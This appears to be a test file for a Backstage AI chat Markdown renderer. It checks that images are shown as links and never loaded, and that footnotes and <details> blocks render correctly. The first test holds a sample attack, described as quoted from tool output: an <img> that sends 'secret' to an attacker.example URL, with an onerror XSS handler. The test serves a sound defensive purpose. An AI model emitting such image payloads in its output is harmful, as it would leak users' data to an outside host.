import { renderInTestApp } from '@backstage/test-utils';
import { screen } from '@testing-library/react';
import Markdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { createMarkdownComponents, useMarkdownStyles } from './MarkdownText';
import {
  chatRehypePlugins,
  chatRemarkRehypeOptions,
} from './chatRehypePlugins';

const loaders = 'img, picture, source, video, audio, iframe, [src], [srcset]';

const ChatMarkdown = ({ text }: { text: string }) => {
  const classes = useMarkdownStyles();
  return (
    <Markdown
      remarkPlugins={[remarkGfm]}
      rehypePlugins={chatRehypePlugins}
      remarkRehypeOptions={chatRemarkRehypeOptions}
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      components={createMarkdownComponents(classes) as any}
    >
      {text}
    </Markdown>
  );
};

describe('chat markdown', () => {
  it('loads nothing from an <img> quoted out of tool output', async () => {
    const { container } = await renderInTestApp(
      <ChatMarkdown
        text={
          'Tool said:\n\n<img src="https://attacker.example/pixel.png?d=secret" alt="pixel" onerror="alert(1)">\n\n<picture><source srcset="https://attacker.example/a.png"></picture>'
        }
      />,
    );

    expect(container.querySelector(loaders)).toBeNull();
    expect(container.querySelector('[onerror]')).toBeNull();
    expect(screen.getByRole('link', { name: /Image: pixel/ })).toHaveAttribute(
      'href',
      'https://attacker.example/pixel.png?d=secret',
    );
  });

  it('renders a Markdown image as a link instead of loading it', async () => {
    const { container } = await renderInTestApp(
      <ChatMarkdown text="![chart](https://example.com/chart.png)" />,
    );

    expect(container.querySelector(loaders)).toBeNull();
    expect(screen.getByRole('link', { name: /Image: chart/ })).toBeVisible();
  });

  it('keeps <details> blocks', async () => {
    const { container } = await renderInTestApp(
      <ChatMarkdown
        text={'<details><summary>Logs</summary>\n\nline one\n\n</details>'}
      />,
    );

    expect(container.querySelector('details > summary')).toHaveTextContent(
      'Logs',
    );
    expect(screen.getByText('line one')).toBeInTheDocument();
  });

  it('links a GFM footnote to its note and back', async () => {
    const { container } = await renderInTestApp(
      <ChatMarkdown text={'A claim.[^1]\n\n[^1]: The source.'} />,
    );

    const ref = container.querySelector('a[data-footnote-ref]');
    const back = container.querySelector('a[data-footnote-backref]');
    const note = ref?.getAttribute('href')?.slice(1);
    const origin = back?.getAttribute('href')?.slice(1);
    expect(note).toBe('user-content-fn-1');
    expect(container.querySelector(`[id="${note}"]`)).toHaveTextContent(
      'The source.',
    );
    expect(origin).toBe('user-content-fnref-1');
    expect(container.querySelector(`[id="${origin}"]`)).toBe(ref);
  });
});
